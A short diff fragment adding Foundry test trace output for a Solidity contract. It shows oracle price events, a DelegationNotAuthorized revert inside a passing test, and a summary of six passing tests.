+    │   │   ├─ emit OraclePrice(price: 1000000000000000000 [1e18])
+    │   │   └─ ← [Return] 1000000000000000000 [1e18], 1
+    │   ├─ emit OraclePriceValidated(collateral: MockERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], price: 1000000000000000000 [1e18])
+    │   └─ ← [Revert] DelegationNotAuthorized(0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e)
+    └─ ← [Return]
+
+Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 1.89ms (747.82µs CPU time)
+
+Ran 2 test suites in 11.99ms (3.47ms CPU time): 6 tests passed, 0 failed, 0 skipped (6 total tests)
